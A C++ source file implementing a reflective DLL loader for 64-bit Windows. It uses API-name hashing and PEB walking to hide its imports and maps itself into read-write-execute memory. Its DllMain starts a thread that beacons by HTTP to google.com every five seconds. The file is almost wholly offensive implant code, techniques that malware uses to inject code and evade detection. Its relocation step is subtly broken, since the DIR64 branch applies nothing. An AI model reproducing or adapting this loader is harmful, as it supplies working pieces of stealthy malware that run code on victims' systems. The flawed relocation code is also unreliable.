#include <Windows.h>
#include <wininet.h>
#include <winuser.h>
#include "Common.h"

#pragma intrinsic( _ReturnAddress )

// Get the current RIP by returning the return address from inside of a function.
__declspec(noinline) ULONG_PTR GetCurrentInstructionPointer(VOID) { return (ULONG_PTR)_ReturnAddress(); }

// Get size of an ASCII string
SIZE_T GetSizeOfStringA(LPSTR string) {

	SIZE_T totalSize = 0;

	for (SIZE_T i = 0; string[i] != '\0'; i++) {
		totalSize++;
	}

	return totalSize;
}

// Get size of an Wide string
SIZE_T GetSizeOfStringW(LPWSTR string) {

	SIZE_T totalSize = 0;

	for (SIZE_T i = 0; string[i] != '\0'; i++) {
		totalSize++;
	}

	return totalSize;
}

// Perform API hashing on ASCII string
DWORD GetHashFromStringA(LPSTR string) {

	SIZE_T stringSize = GetSizeOfStringA(string);
	DWORD hash = 0x35;

	for (SIZE_T i = 0; i < stringSize; i++) {
		hash += (hash * 0xab10f29e + string[i]) & 0xffffff;
	}

	return hash;
}

// Perform API hashing on Wide string
DWORD GetHashFromStringW(LPWSTR string) {
	SIZE_T stringSize = GetSizeOfStringW(string);
	DWORD hash = 0x35;

	for (SIZE_T i = 0; i < stringSize; i++) {
		hash += (hash * 0xab10f29e + string[i]) & 0xffffff;
	}

	return hash;
}

ULONG_PTR GetFunctionOffset(DWORD functionHashToResolve, PIMAGE_DOS_HEADER imageBase) {

	// Loop through the Export table of an in memory DLL and locate the offset of a function specifed by the functionToResolve string

	PIMAGE_NT_HEADERS64 ntHeaders = (PIMAGE_NT_HEADERS64)(imageBase->e_lfanew + (LPBYTE)imageBase);
	PIMAGE_OPTIONAL_HEADER64 optionalHeader = (PIMAGE_OPTIONAL_HEADER64)& ntHeaders->OptionalHeader;
	DWORD imageExportDirectoryRVA = optionalHeader->DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;

	PIMAGE_EXPORT_DIRECTORY kernel32ExportDirectory = (PIMAGE_EXPORT_DIRECTORY)(imageExportDirectoryRVA + (LPBYTE)imageBase);
	PDWORD addressOfNames = (PDWORD)(kernel32ExportDirectory->AddressOfNames + (LPBYTE)imageBase);
	PWORD ordinalTable = (PWORD)(kernel32ExportDirectory->AddressOfNameOrdinals + (LPBYTE)imageBase);
	PDWORD addressOfFunctions = (PDWORD)(kernel32ExportDirectory->AddressOfFunctions + (LPBYTE)imageBase);

	for (DWORD i = 0; i < kernel32ExportDirectory->NumberOfNames; i++) {
		LPSTR currentFunctionName = (LPSTR)(addressOfNames[i] + (LPBYTE)imageBase);

		if (GetHashFromStringA(currentFunctionName) == functionHashToResolve) {
			ULONG_PTR currentFunctionVA = (ULONG_PTR)(addressOfFunctions[ordinalTable[i]] + (LPBYTE)imageBase);
			return currentFunctionVA;
		}

	}

	return NULL;
}

extern "C" __declspec(dllexport) void ReflectiveLoader(VOID) {

	/*
	Step 1: Find Base Address of Current Module

	We will find the current instruction pointer and then loop towards the top untill
	we locate the PE MZ signature, this will indicate to us that we found the base address
	of our current module.
*/

	ULONG_PTR pCurrentInstructionPointer = GetCurrentInstructionPointer();
	PIMAGE_DOS_HEADER pCurrentDLLModule = (PIMAGE_DOS_HEADER)pCurrentInstructionPointer;


	while (TRUE) {

		if (pCurrentDLLModule->e_magic == IMAGE_DOS_SIGNATURE) {

			// some x64 dll's can trigger a bogus signature (IMAGE_DOS_SIGNATURE == 'POP r10'),
			// we sanity check the e_lfanew with an upper threshold value of 1024 to avoid problems.
			// Reference: https://github.com/stephenfewer/ReflectiveDLLInjection/blob/178ba2a6a9feee0a9d9757dcaa65168ced588c12/dll/src/ReflectiveLoader.c#L94
			if (pCurrentDLLModule->e_lfanew >= sizeof(IMAGE_DOS_HEADER) && pCurrentDLLModule->e_lfanew < 1024) {
				PIMAGE_NT_HEADERS64 pSuspectedNtHeaders = (PIMAGE_NT_HEADERS64)(pCurrentDLLModule->e_lfanew + (LPBYTE)pCurrentDLLModule);
				if (pSuspectedNtHeaders->Signature == IMAGE_NT_SIGNATURE) {
					break;
				}
			}
		}

		pCurrentDLLModule = (PIMAGE_DOS_HEADER)((LPBYTE)pCurrentDLLModule - 1);
	}


	/*
		Step 2: Find Kernel32.dll and resolve LoadLibraryA, GetProcAddress, and VirtualAlloc

		In memory it will be named L"KERNEL32.DLL"
	*/

	// Through PEB find the base address of Kernel32.dll

	_PPEB pPEB = (_PPEB)__readgsqword(0x60);
	PLDR_DATA_TABLE_ENTRY pCurrentPLDRDataTableEntry = (PLDR_DATA_TABLE_ENTRY)pPEB->pLdr->InMemoryOrderModuleList.Flink;
	ULONG_PTR pKernel32Module = NULL;

	do {
		PWSTR currentModuleString = pCurrentPLDRDataTableEntry->BaseDllName.pBuffer;
		if (GetHashFromStringW(currentModuleString) == KERNEL32DLL_HASH) {
			pKernel32Module = (ULONG_PTR)pCurrentPLDRDataTableEntry->DllBase;
			break;
		}

		pCurrentPLDRDataTableEntry = (PLDR_DATA_TABLE_ENTRY)pCurrentPLDRDataTableEntry->InMemoryOrderModuleList.Flink;

	} while (pCurrentPLDRDataTableEntry->TimeDateStamp != 0);

	// Resolve LoadLibraryA, GetProcAddress, VirtualAlloc, and FlishInstructionCacheAddress
	VIRTUALALLOC pVirtualAlloc = (VIRTUALALLOC)GetFunctionOffset(VIRTUALALLOC_HASH, (PIMAGE_DOS_HEADER)pKernel32Module);
	FLUSHINSTRUCTIONCACHE pFlushInstructionCache = (FLUSHINSTRUCTIONCACHE)GetFunctionOffset(FLUSHINSTRUCTIONCACHE_HASH, (PIMAGE_DOS_HEADER)pKernel32Module);
	LOADLIBRARYA pLoadLibraryAAddress = (LOADLIBRARYA)GetFunctionOffset(LOADLIBRARYA_HASH, (PIMAGE_DOS_HEADER)pKernel32Module);
	GETPROCADDRESS pGetProcAddressAddress = (GETPROCADDRESS)GetFunctionOffset(GETPROCADDRESS_HASH, (PIMAGE_DOS_HEADER)pKernel32Module);

	/*
		Step 3: Find the SizeOfImage of the current DLL Module. Allocate a buffer the size of SizeOf Image
	*/

	// Find SizeOfImage from the current DLL in memory
	PIMAGE_NT_HEADERS pCurrentDLLModuleNTHeaders = (PIMAGE_NT_HEADERS)(pCurrentDLLModule->e_lfanew + (LPBYTE)pCurrentDLLModule);
	DWORD sizeOfImageOfCurrentDLLModule = pCurrentDLLModuleNTHeaders->OptionalHeader.SizeOfImage;

	// Allocate enough space to copy the DLL over and map it in memory
	LPVOID pMappedCurrentDLL = pVirtualAlloc(NULL, sizeOfImageOfCurrentDLLModule, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

	/*
		Step 4: Copy the headers into the new buffer.
				Loop through each PE section and copy it into the new buffer as well
	*/

	// Copy PE headers to pMappedCurrentDLL
	DWORD sizeOfHeaders = pCurrentDLLModuleNTHeaders->OptionalHeader.SizeOfHeaders;
	for (DWORD i = 0; i < sizeOfHeaders; i++) {
		((LPBYTE)pMappedCurrentDLL)[i] = ((LPBYTE)pCurrentDLLModule)[i];
	}

	// Map PE sections into pMappedCurrentDLL
	DWORD numberOfSections = pCurrentDLLModuleNTHeaders->FileHeader.NumberOfSections;

	PIMAGE_OPTIONAL_HEADER64 pCurrentDLLModuleOptionalHeader = &pCurrentDLLModuleNTHeaders->OptionalHeader;
	PIMAGE_SECTION_HEADER pCurrentSectionHeader = (PIMAGE_SECTION_HEADER)(pCurrentDLLModuleNTHeaders->FileHeader.SizeOfOptionalHeader + (LPBYTE)pCurrentDLLModuleOptionalHeader);

	for (DWORD i = 0; i < numberOfSections; i++) {

		if (pCurrentSectionHeader->SizeOfRawData != 0) {
			LPBYTE pDestinationAddress = (LPBYTE)pMappedCurrentDLL + pCurrentSectionHeader->VirtualAddress;
			LPBYTE pSourceAddress = (LPBYTE)pCurrentDLLModule + pCurrentSectionHeader->PointerToRawData;
			DWORD currentSectionRawSize = pCurrentSectionHeader->SizeOfRawData; // We copy the entire section, if an entire section is not needed in memory the uneeded portion will be overwritten by another section

			for (DWORD i = 0; i < currentSectionRawSize; i++) {
				pDestinationAddress[i] = pSourceAddress[i];
			}
		}

		pCurrentSectionHeader++;
	}

	/*
		Step 5: Resolve the IAT of the DLL and load any additonal DLLs needed'
	*/

	PIMAGE_NT_HEADERS64 pMappedCurrentDLLNTHeader = (PIMAGE_NT_HEADERS64)(((PIMAGE_DOS_HEADER)pMappedCurrentDLL)->e_lfanew + (LPBYTE)pMappedCurrentDLL);
	PIMAGE_IMPORT_DESCRIPTOR pMappedCurrentDLLImportDescriptor = (PIMAGE_IMPORT_DESCRIPTOR)(pMappedCurrentDLLNTHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress + (LPBYTE)pMappedCurrentDLL);

	while (pMappedCurrentDLLImportDescriptor->Name != NULL) {
		LPSTR currentDLLName = (LPSTR)(pMappedCurrentDLLImportDescriptor->Name + (LPBYTE)pMappedCurrentDLL);
		HMODULE hCurrentDLLModule = pLoadLibraryAAddress(currentDLLName);

		PIMAGE_THUNK_DATA64 pImageThunkData = (PIMAGE_THUNK_DATA64)(pMappedCurrentDLLImportDescriptor->FirstThunk + (LPBYTE)pMappedCurrentDLL);

		while (pImageThunkData->u1.AddressOfData) {

			if (pImageThunkData->u1.Ordinal & 0x8000000000000000) {
				// Import is by ordinal
			
				FARPROC resolvedImportAddress = pGetProcAddressAddress(hCurrentDLLModule, MAKEINTRESOURCEA(pImageThunkData->u1.Ordinal));

				if (resolvedImportAddress == NULL) {
					return;
				}

				// Overwrite entry in IAT with the address of resolved function
				pImageThunkData->u1.AddressOfData = (ULONGLONG)resolvedImportAddress;

			}
			else {
				// Import is by name
				PIMAGE_IMPORT_BY_NAME pAddressOfImportData = (PIMAGE_IMPORT_BY_NAME)((pImageThunkData->u1.AddressOfData) + (LPBYTE)pMappedCurrentDLL);
				FARPROC resolvedImportAddress = pGetProcAddressAddress(hCurrentDLLModule, pAddressOfImportData->Name);

				if (resolvedImportAddress == NULL) {
					return;
				}

				// Overwrite entry in IAT with the address of resolved function
				pImageThunkData->u1.AddressOfData = (ULONGLONG)resolvedImportAddress;

			}

			pImageThunkData++;
		}

		pMappedCurrentDLLImportDescriptor++;
	}

	/*
		Step 6: Process the newly loaded copy of the images relocation table
	*/

	DWORD numberOfRelocEntires;
	PIMAGE_BASE_RELOCATION pCurrentBaseRelocation = (PIMAGE_BASE_RELOCATION)(pMappedCurrentDLLNTHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress + (LPBYTE)pMappedCurrentDLL);
	PIMAGE_RELOC pCurrentBaseRelocationEntry;

	while (pCurrentBaseRelocation->VirtualAddress != 0) {

		numberOfRelocEntires = ((pCurrentBaseRelocation->SizeOfBlock) - 0x8) / 0x2;
		pCurrentBaseRelocationEntry = (PIMAGE_RELOC)((LPBYTE)pCurrentBaseRelocation + sizeof(IMAGE_BASE_RELOCATION));

		for (DWORD i = numberOfRelocEntires; i != 0; i--) {
			if (pCurrentBaseRelocationEntry->type == IMAGE_REL_BASED_DIR64) {
			}
			pCurrentBaseRelocationEntry++;
		}

		pCurrentBaseRelocation = (PIMAGE_BASE_RELOCATION)((LPBYTE)pCurrentBaseRelocation + pCurrentBaseRelocation->SizeOfBlock);
	}


	/*
		Step 7: Call DLLMain as thread with the DLL_PROCESS_ATTACH as a paramter, after exit terminating the ReflectiveLoader thread.
	*/	

	ULONG_PTR pDllEntryPoint = (ULONG_PTR)(pMappedCurrentDLLNTHeader->OptionalHeader.AddressOfEntryPoint + (LPBYTE)pMappedCurrentDLL);

	pFlushInstructionCache((HANDLE)-1, NULL, 0);

	typedef BOOL(WINAPI* DLLMAIN)(HINSTANCE, DWORD, LPVOID);
	((DLLMAIN)pDllEntryPoint) ((HINSTANCE)pMappedCurrentDLL, DLL_PROCESS_ATTACH, NULL);

}

int sendHTTPRequest() {


	LPCSTR userAgent = "agent";
	LPCSTR connectDomain = "google.com";
	LPCSTR httpRequestType = "GET";
	LPCSTR targetPath = "/test";

	HINTERNET internetHandle = InternetOpenA(userAgent, INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
	if (internetHandle == NULL) {
		return -1;
	}

	DWORD_PTR dwService = (DWORD_PTR)NULL;

	HINTERNET httpHandle = InternetConnectA(internetHandle, connectDomain, INTERNET_DEFAULT_HTTP_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, dwService);
	if (httpHandle == NULL) {
		return -1;
	}

	HINTERNET httpRequestHandle = HttpOpenRequestA(httpHandle, httpRequestType, targetPath, NULL, NULL, NULL, 0, dwService);
	if (httpRequestHandle == NULL) {
		return -1;
	}

	BOOL result = HttpSendRequestA(httpRequestHandle, NULL, 0, NULL, 0);
	InternetCloseHandle(internetHandle);

	return 1;
}

void loopHTTPConnect() {

	while (true) {
		Sleep(5000);
		sendHTTPRequest();
	}

}

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{

	HANDLE hThread = NULL;

    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
		hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)loopHTTPConnect, NULL, 0, NULL);

		if (hThread == NULL) {
			return FALSE;
		}
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

